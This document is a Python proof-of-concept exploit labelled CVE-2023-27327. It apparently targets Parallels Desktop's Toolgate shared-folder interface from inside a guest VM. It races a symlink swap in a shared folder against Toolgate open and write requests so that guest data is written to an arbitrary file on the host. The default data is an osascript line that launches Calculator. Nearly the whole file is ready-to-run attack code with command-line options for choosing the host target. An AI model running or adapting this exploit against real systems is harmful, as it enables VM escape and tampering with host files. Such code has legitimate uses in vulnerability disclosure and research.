#!/usr/bin/env python3

# CVE-2023-27327

import argparse
import os
import stat
import threading
from pwn import *
from toolgate import *

tg = ToolgateClient(device_path='/proc/driver/prl_tg_pwn')

race_won = False

def racer(share_path: str, host_path: str) -> None:
    """
    Creates two files in the share, one is a symlink pointing to a host path 
    which we want to open, and the other is an empty file. Then we continuously 
    switch them in a loop.
    """
    log.info('Racer running')
    file = os.path.join(share_path, 'file')
    link = os.path.join(share_path, 'link')
    scratch = file + '.'
    try:
        os.unlink(link)
    except:
        pass
    
    try:
        os.unlink(file)
    except:
        pass

    fd = os.open(file, os.O_RDONLY | os.O_CREAT | stat.S_IRWXU)
    os.close(fd)
    os.symlink(host_path, link)
    while not race_won:
        try:
            os.rename(file, scratch)
        except:
            pass
        
        try:
            os.rename(link, file)
        except:
            pass
        
        try: 
            os.rename(scratch, link)
        except:
            pass

def main(args: argparse.Namespace): 
    global race_won
    shares = tg.get_shared_folder_list()
    share_path = None
    shared_folder_id = None
    
    if not args.share_path:
        for shared_folder_id, share in enumerate(shares):
            p = f'/media/psf/{share}'
            if os.path.exists(p):
                share_path = p
                break
    else:
        share_path = args.share_path
        shared_folder_id = 0

    if share_path is None:
        log.info('No suitable share found. Are there shared folders mounted? If so, try the --share-path flag')
        return

    shared_folder_id += 1
    share_path = share_path.rstrip('/')
    share_name = os.path.basename(share_path)
    log.info(f'Share path: {share_path}')
    log.info(f'Share name: {share_name}')
    log.info(f'Share id:   {shared_folder_id}')

    racer_thread = threading.Thread(target=racer, args=(share_path, args.host_path))
    log.info('Spawning racer')
    racer_thread.start()
    
    with open(args.guest_path, 'rb') as f:
        file_data = f.read()
     
    tries = 0
    while tries < 1000:
        # Open file, which may or may not be pointing outside the share
        path = f'/{share_name}/file'.encode('utf-8')
        pfd = prlfs_file_desc(
            0xffffffff,
            0,
            os.O_RDWR | os.O_APPEND,
            shared_folder_id,
        )
        buf1 = tg.get_tg_buffer_from_data(path, writeable=True)
        buf2 = tg.get_tg_buffer_from_data(bytes(pfd), writeable=True)
        req = create_tg_request_type(0, 2)(TG_REQUEST_FS_L_OPEN, TG_STATUS_PENDING, 0, 2, 0, b'', (TG_BUFFER * 2)(buf1, buf2))
        tg.submit(req)
        output = tg.get_bytes_from_tg_buffer(buf2)
        pfd = prlfs_file_desc.from_buffer_copy(output)

        if req.Status != TG_STATUS_SUCCESS:
            continue

        # Attempt the write
        pfd = prlfs_file_desc(
            pfd.fd,
            0,
            0,
            shared_folder_id,
        )
        buf1 = tg.get_tg_buffer_from_data(bytes(pfd), writeable=False)
        buf2 = tg.get_tg_buffer_from_data(file_data, writeable=False)
        req = create_tg_request_type(0, 2)(TG_REQUEST_FS_L_RW, TG_STATUS_PENDING, 0, 2, 0, b'', (TG_BUFFER * 2)(buf1, buf2))
        tg.submit(req)
        tries += 1

    log.info('Terminating racer')
    race_won = True
    racer_thread.join()
    log.info(f'File written to {args.host_path}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'guest_path',
        help='Path to file on guest which will be written on host')
    parser.add_argument(
        'host_path', 
        help='Path of the file on the host which you want to read or write')
    parser.add_argument(
        '--data', 
        help='The data to append or write to the host file', 
        default='\nosascript -e \'tell application "Calculator.app" to activate\'\n', 
        required=False)
    parser.add_argument(
        '--share-path', 
        help='Path of the share, e.g. /media/psf/Home', 
        required=False)
    args = parser.parse_args()
    
    try:
        main(args)
    except KeyboardInterrupt:
        log.info('Exiting')
        race_won = True
        tg.close()
